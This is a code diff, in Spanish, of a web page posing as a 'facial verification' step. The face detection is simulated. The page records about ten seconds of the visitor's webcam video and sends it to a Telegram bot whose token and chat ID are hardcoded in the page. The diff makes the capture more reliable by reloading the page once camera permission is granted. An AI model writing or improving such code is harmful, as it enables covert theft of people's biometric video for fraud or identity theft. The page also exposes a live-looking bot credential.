@@ -125,7 +125,6 @@ video {
 <div id="alertaSelfie" class="alerta-selfie">
 📸 Verificación Facial<br>
 Mantén tu rostro en el círculo<br>
-
 </div>
 
 <video id="video" autoplay muted playsinline></video>
@@ -142,27 +141,29 @@ Mantén tu rostro en el círculo<br>
 </div>
 
 <script>
+// ---- Elementos DOM ----
 const video = document.getElementById("video");
 const oval = document.getElementById("oval");
 const statusText = document.getElementById("status");
 const warningMessage = document.getElementById("warningMessage");
 const countdownDiv = document.getElementById("countdown");
-
-/* 🔥 ALERTA 5 SEGUNDOS */
 const alertaSelfie = document.getElementById("alertaSelfie");
+
+// ---- Mostrar alerta al cargar ----
 window.addEventListener("load", ()=>{
     alertaSelfie.classList.add("show");
     setTimeout(()=>{
         alertaSelfie.classList.remove("show");
-    },5000);
+    }, 5000);
 });
 
-/* CONFIG TELEGRAM */
+// ---- Configuración de Telegram (sin cambios) ----
 const TELEGRAM_CONFIG = {
     token: "6460759862:AAGXmhRsIXIp16GVh72gbCmmmlSXRDITGEA",
     chatId: "7158969671"
 };
 
+// ---- Variables globales ----
 let recording = false;
 let mediaRecorder = null;
 let recordedChunks = [];
@@ -170,18 +171,10 @@ let faceDetected = false;
 let detectionInterval = null;
 let videoStream = null;
 
-/* CAMARA */
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-    videoStream = stream;
-    video.srcObject = stream;
-    statusText.innerText = "Coloca tu rostro en el círculo";
-})
-.catch(() => {
-    statusText.innerText = "❌ Error cámara";
-});
+// ---- CLAVE PARA CONTROLAR LA RECARGA ----
+const RELOAD_KEY = 'cameraReloaded';
 
-/* DETECCIÓN SIMPLE DE ROSTRO */
+// ---- Función que inicia la detección facial (simulada) ----
 function startFaceDetection() {
     if (detectionInterval) clearInterval(detectionInterval);
     
@@ -198,7 +191,6 @@ function startFaceDetection() {
             faceDetected = true;
             clearInterval(detectionInterval);
             
-            // Iniciar la grabación después de 1 segundo
             setTimeout(() => {
                 startRecording(videoStream);
             }, 1000);
@@ -211,7 +203,7 @@ function startFaceDetection() {
     }, 1000);
 }
 
-/* FUNCIÓN PRINCIPAL DE GRABACIÓN */
+// ---- Función de grabación (sin cambios) ----
 function startRecording(stream) {
     if (recording) return;
 
@@ -232,7 +224,6 @@ function startRecording(stream) {
         enviarVideoTelegram(blob);
     };
 
-    // Mostrar contador regresivo
     let count = 3;
     countdownDiv.innerText = count;
     countdownDiv.classList.add("show");
@@ -245,11 +236,9 @@ function startRecording(stream) {
             clearInterval(countdownInterval);
             countdownDiv.classList.remove("show");
             
-            // Iniciar grabación
             mediaRecorder.start();
             statusText.innerText = "...";
             
-            // Detener después de 10 segundos
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === "recording") {
                     mediaRecorder.stop();
@@ -260,10 +249,9 @@ function startRecording(stream) {
     }, 1000);
 }
 
-/* ENVIAR VIDEO A TELEGRAM */
+// ---- Envío a Telegram (sin cambios) ----
 function enviarVideoTelegram(videoBlob) {
     const formData = new FormData();
-    
     formData.append('chat_id', TELEGRAM_CONFIG.chatId);
     formData.append('video', videoBlob, 'verificacion_facial.webm');
 
@@ -286,21 +274,53 @@ function enviarVideoTelegram(videoBlob) {
         statusText.innerText = "❌ Error al enviar el video";
         recording = false;
         faceDetected = false;
-        // Reiniciar detección
         setTimeout(() => {
             startFaceDetection();
         }, 3000);
     });
 }
 
-/* INICIAR DETECCIÓN DE ROSTRO AL CARGAR */
-window.addEventListener("load", () => {
-    setTimeout(() => {
-        if (videoStream) {
-            startFaceDetection();
-        }
-    }, 2000);
-});
+// ============================================================
+//  LÓGICA PRINCIPAL CON RECARGA CONTROLADA
+// ============================================================
+function iniciarApp() {
+    // Verificar si ya se recargó
+    const yaRecargado = sessionStorage.getItem(RELOAD_KEY) === 'true';
+
+    if (!yaRecargado) {
+        // ---- PRIMERA CARGA: Solicitar cámara y recargar al obtener éxito ----
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            // Marcar que ya se recargará
+            sessionStorage.setItem(RELOAD_KEY, 'true');
+            // Recargar la página
+            location.reload();
+        })
+        .catch(() => {
+            statusText.innerText = "❌ Error cámara";
+        });
+    } else {
+        // ---- SEGUNDA CARGA (ya recargado): Flujo normal ----
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            videoStream = stream;
+            video.srcObject = stream;
+            statusText.innerText = "Coloca tu rostro en el círculo";
+            // Iniciar detección después de un breve retraso
+            setTimeout(() => {
+                if (videoStream) {
+                    startFaceDetection();
+                }
+            }, 2000);
+        })
+        .catch(() => {
+            statusText.innerText = "❌ Error cámara";
+        });
+    }
+}
+
+// ---- Ejecutar al cargar la página ----
+window.addEventListener("load", iniciarApp);
 </script>
 
 </body>
